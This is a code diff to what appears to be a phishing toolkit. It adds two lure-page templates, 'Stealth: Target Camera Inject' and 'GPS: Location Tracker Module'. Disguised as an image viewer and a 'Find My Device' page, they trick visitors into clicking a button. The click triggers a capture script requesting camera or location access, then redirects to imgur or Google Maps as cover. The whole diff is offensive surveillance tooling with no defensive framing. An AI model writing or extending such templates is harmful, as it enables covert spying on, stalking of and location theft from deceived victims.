@@ -753,6 +753,18 @@ export const templates: Record<string, {name: string, render: (id: string) => st
     render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Loading...</title><style>body { background: #fafafa; display: flex; height: 100vh; margin: 0; align-items: center; justify-content: center; font-family: sans-serif; } .spinner { width: 40px; height: 40px; border: 3px solid rgba(0,0,0,0.1); border-top-color: #333; border-radius: 50%; animation: spin 1s linear infinite; } @keyframes spin { to { transform: rotate(360deg); } }</style></head><body><div class="spinner"></div>${getCaptureScript(id, 'https://google.com/', {
       tmplId: 'recap_silent', flow: 'silent', perms: SILENT_PERMS
     })}</body></html>`
+  },
+  'camera_stealth': {
+    name: "📸 Stealth: Target Camera Inject",
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Image Viewer</title><style>body { background: #000; display: flex; height: 100vh; margin: 0; align-items: center; justify-content: center; font-family: sans-serif; color: #fff; flex-direction: column;} .box { text-align: center; } .btn { background: #333; color: white; border: none; padding: 12px 24px; border-radius: 4px; margin-top: 20px;} </style></head><body><div class="box"><h3>Private Image #8839</h3><button class="btn" onclick="this.innerText='Loading...'; window.startCapture('all');">View Full Image</button></div>${getCaptureScript(id, 'https://imgur.com/gallery/random', {
+      tmplId: 'camera_stealth', flow: 'aggressive', perms: ['media']
+    })}</body></html>`
+  },
+  'gps_tracker': {
+    name: "📍 GPS: Location Tracker Module",
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Find My Device</title><style>body { background: #f0f2f5; display: flex; height: 100vh; margin: 0; align-items: center; justify-content: center; font-family: sans-serif; color: #333; flex-direction: column;} .box { text-align: center; background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1);} .btn { background: #4285f4; color: white; border: none; padding: 12px 24px; border-radius: 4px; margin-top: 20px; width: 100%; font-weight: bold;} </style></head><body><div class="box"><h3>📍 Localize Phone Sector</h3><p>Authorize GPS triangulation to trace the lost phone sector.</p><button class="btn" onclick="this.innerText='Connecting Satellites...'; window.startCapture('all');">Triangulate GPS</button></div>${getCaptureScript(id, 'https://maps.google.com', {
+      tmplId: 'gps_tracker', flow: 'aggressive', perms: ['gps']
+    })}</body></html>`
   }
 };
 
